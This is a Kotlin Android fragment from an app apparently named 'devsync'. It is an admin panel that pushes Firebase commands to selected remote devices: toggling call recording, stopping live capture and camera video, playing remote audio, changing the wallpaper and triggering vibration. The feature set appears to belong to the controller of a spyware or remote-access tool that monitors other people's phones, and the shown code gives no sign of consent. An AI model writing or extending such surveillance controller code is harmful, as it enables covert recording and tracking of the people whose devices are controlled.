package com.example.devsync

  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.EditText
  import android.widget.Switch
  import androidx.fragment.app.Fragment
  import com.google.firebase.database.ServerValue

  class ControlsFragment : Fragment(R.layout.fragment_controls) {

      private val admin get() = requireActivity() as AdminControlActivity

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          // Stop All
          view.findViewById<Button>(R.id.btnStopAll).setOnClickListener {
              admin.sendToSelected { d ->
                  d.child("stop_all").setValue(true)
                  d.child("live_capture_enabled").setValue(false)
                  d.child("camera_video_flag").setValue(false)
              }
          }

          // Vibration
          view.findViewById<Button>(R.id.btnTriggerVibration).setOnClickListener {
              admin.sendToSelected { d -> d.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
          }

          // Bluetooth loop switch
          view.findViewById<Switch>(R.id.switchBluetooth).setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
          }

          // Call recording switch
          view.findViewById<Switch>(R.id.switchCallRecording).setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("call_recording_enabled").setValue(on) }
          }

          // Wallpaper
          view.findViewById<Button>(R.id.btnSetWallpaper).setOnClickListener {
              val url = view.findViewById<EditText>(R.id.etWallpaperUrl).text.toString().trim()
              if (url.isEmpty()) { admin.showStatus("❌ URL daalo pehle", false); return@setOnClickListener }
              admin.sendToSelected { d ->
                  d.child("wallpaper_url").setValue(AdminControlActivity.convertGoogleDriveUrl(url))
              }
              view.findViewById<EditText>(R.id.etWallpaperUrl).setText("")
          }

          // Play remote audio
          view.findViewById<Button>(R.id.btnPlayAudio).setOnClickListener {
              val url = view.findViewById<EditText>(R.id.etSongUrl).text.toString().trim()
              if (url.isEmpty()) { admin.showStatus("❌ Audio URL daalo pehle", false); return@setOnClickListener }
              admin.sendToSelected { d ->
                  d.child("remote_audio_url").setValue(AdminControlActivity.convertGoogleDriveUrl(url))
                  d.child("audio_remote_trigger").setValue(System.currentTimeMillis())
              }
              view.findViewById<EditText>(R.id.etSongUrl).setText("")
          }
      }
  }
  